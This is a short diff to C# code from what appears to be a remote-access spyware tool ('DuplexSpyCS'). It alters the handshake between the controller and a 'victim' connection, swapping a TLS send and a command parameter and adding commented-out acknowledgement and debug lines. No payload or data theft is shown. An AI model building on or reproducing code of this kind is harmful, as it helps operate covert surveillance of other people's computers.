@@ -143,8 +143,7 @@ namespace DuplexSpyCS
                 byte[] abStaticRecvBuffer;
                 byte[] abDynamicRecvBuffer = { };
 
-                victim.fnSslSend(1, 0, clsEZData.fnGenerateRandomStr());
-                victim.fnSendCmdParam(2, 1);
+                victim.fnSendCmdParam(1, 0);
 
                 do
                 {
@@ -159,6 +158,8 @@ namespace DuplexSpyCS
                     abDynamicRecvBuffer = fnCombineBytes(
                         abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length,
                         abStaticRecvBuffer, 0, nRecv);
+
+                    //victim.fnSslSend(CMD_TLS, PARA_ACK, clsEZData.fnGenerateRandomStr());
 
                     while (true)
                     {
@@ -177,6 +178,8 @@ namespace DuplexSpyCS
                         byte[] msg = dsp.GetMsg().msg;
 
                         abDynamicRecvBuffer = dsp.MoreData;
+
+                        //MessageBox.Show($"{cmd},{para}");
 
                         if (cmd == CMD_TLS && para == PARA_HELLO)
                         {
